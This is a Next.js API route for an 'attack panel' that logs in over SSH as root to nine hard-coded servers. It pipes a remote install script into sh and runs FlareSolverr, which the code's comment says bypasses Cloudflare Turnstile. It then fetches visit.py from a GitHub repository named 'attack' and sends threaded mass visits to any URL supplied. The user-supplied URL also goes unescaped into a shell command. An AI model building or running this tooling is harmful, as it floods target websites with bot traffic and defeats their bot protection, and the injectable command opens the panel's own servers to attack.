import { NextResponse } from 'next/server';
import { Client } from 'ssh2';


const DEFAULT_SERVERS = [
  { host: '138.68.141.40', username: 'root' },
  { host: '144.126.234.13', username: 'root' },
  { host: '46.101.52.177', username: 'root' },
  { host: '142.93.41.217', username: 'root' },
  { host: '167.99.94.250', username: 'root' },
  { host: '165.22.118.138', username: 'root' },
  { host: '167.71.135.147', username: 'root' },
  { host: '138.68.141.255', username: 'root' },
  { host: '206.189.21.125', username: 'root' }
];

// New setup: Docker + FlareSolverr (bypasses CF Turnstile)
const SETUP_COMMAND = 'export DEBIAN_FRONTEND=noninteractive && (which docker > /dev/null 2>&1 || (curl -fsSL https://get.docker.com | sh)) && docker rm -f flaresolverr 2>/dev/null; docker pull ghcr.io/flaresolverr/flaresolverr:latest && docker run -d --name flaresolverr --restart=always -p 8191:8191 -e LOG_LEVEL=info ghcr.io/flaresolverr/flaresolverr:latest && pip3 install requests --break-system-packages -q 2>/dev/null; pip3 install requests -q 2>/dev/null; sleep 10 && curl -s http://localhost:8191/ | grep -q FlareSolverr && echo SETUP_COMPLETE || echo SETUP_FAILED';

async function runSSHCommand(server, command, timeout = 8000) {
  return new Promise((resolve) => {
    const conn = new Client();
    let output = '';
    let resolved = false;

    const done = (result) => {
      if (!resolved) {
        resolved = true;
        try { conn.end(); } catch(e) {}
        resolve(result);
      }
    };

    const timer = setTimeout(() => {
      done({ status: 'success', output: output.trim() || 'Command sent (timeout)' });
    }, timeout);

    conn.on('ready', () => {
      conn.exec(command, { pty: false }, (err, stream) => {
        if (err) {
          clearTimeout(timer);
          return done({ status: 'error', error: err.message });
        }

        stream.on('data', (data) => {
          output += data.toString();
        });

        stream.stderr.on('data', (data) => {
          // ignore stderr
        });

        stream.on('close', () => {
          clearTimeout(timer);
          done({ status: 'success', output: output.trim() || 'Done' });
        });
      });
    });

    conn.on('error', (err) => {
      clearTimeout(timer);
      done({ status: 'error', error: err.message });
    });

    conn.connect({
      host: server.host,
      port: 22,
      username: server.username,
      password: process.env.VPS_PASSWORD,
      readyTimeout: 5000,
      keepaliveInterval: 3000,
    });
  });
}

export async function POST(req) {
  try {
    const { action, url, visitors, duration, servers, proxies, captchaApiKey } = await req.json();
    const serverList = (servers && servers.length > 0) ? servers : DEFAULT_SERVERS;

    if (action === 'setup') {
      const results = await Promise.all(
        serverList.map(async (server) => {
          const r = await runSSHCommand(server, `nohup bash -c '${SETUP_COMMAND}' > /root/setup.log 2>&1 & echo "Setup started"`, 8000);
          return { host: server.host, ...r };
        })
      );
      return NextResponse.json({ results });

    } else if (action === 'deploy') {
      // Fetch latest visit.py from GitHub
      let scriptB64;
      try {
        const ghResp = await fetch('https://raw.githubusercontent.com/fanarali881-eng/attack/main/visit.py', {
          headers: { 'User-Agent': 'attack-panel' }
        });
        if (!ghResp.ok) throw new Error(`GitHub returned ${ghResp.status}`);
        const scriptContent = await ghResp.text();
        scriptB64 = Buffer.from(scriptContent).toString('base64');
      } catch(e) {
        return NextResponse.json({ error: 'Could not fetch visit.py from GitHub: ' + e.message }, { status: 500 });
      }
      
      const results = await Promise.all(
        serverList.map(async (server) => {
          const deployCmd = `echo "${scriptB64}" | base64 -d > /root/visit.py && wc -c /root/visit.py && echo "Script deployed successfully"`;
          const r = await runSSHCommand(server, deployCmd, 15000);
          return { host: server.host, ...r };
        })
      );
      return NextResponse.json({ results });

    } else if (action === 'start') {
      if (!url) return NextResponse.json({ error: "URL is required" }, { status: 400 });
      const totalVisitors = visitors || 100;
      const serverCount = serverList.length;
      const perServer = Math.ceil(totalVisitors / serverCount);
      const threads = 15; // concurrent threads per server

      const results = await Promise.all(
        serverList.map(async (server) => {
          // Kill old processes, ensure FlareSolverr running, start visit.py
          const fullCmd = `killall -9 python3 2>/dev/null; sleep 1; docker start flaresolverr 2>/dev/null; sleep 2; nohup python3 /root/visit.py "${url}" ${perServer} ${threads} > /root/visit.log 2>&1 & echo "Started PID=$! - ${perServer} visits with ${threads} threads"`;
          
          const r = await runSSHCommand(server, fullCmd, 15000);
          return { host: server.host, ...r };
        })
      );
      return NextResponse.json({ results });

    } else if (action === 'stop') {
      const results = await Promise.all(
        serverList.map(async (server) => {
          const r = await runSSHCommand(server, 'kill -9 $(pgrep -f "visit.py") 2>/dev/null; killall -9 python3 2>/dev/null; echo "Stopped"', 15000);
          return { host: server.host, ...r };
        })
      );
      return NextResponse.json({ results });

    } else if (action === 'status') {
      // Check status of visits on all servers
      const results = await Promise.all(
        serverList.map(async (server) => {
          const r = await runSSHCommand(server, 'tail -5 /root/visit.log 2>/dev/null || echo "No log"; pgrep -f visit.py > /dev/null && echo "RUNNING" || echo "STOPPED"; curl -s http://localhost:8191/ 2>/dev/null | grep -q FlareSolverr && echo "FLARE_OK" || echo "FLARE_DOWN"', 10000);
          return { host: server.host, ...r };
        })
      );
      return NextResponse.json({ results });

    } else {
      return NextResponse.json({ error: "Unknown action" }, { status: 400 });
    }
  } catch (error) {
    return NextResponse.json({ error: error.message }, { status: 500 });
  }
}
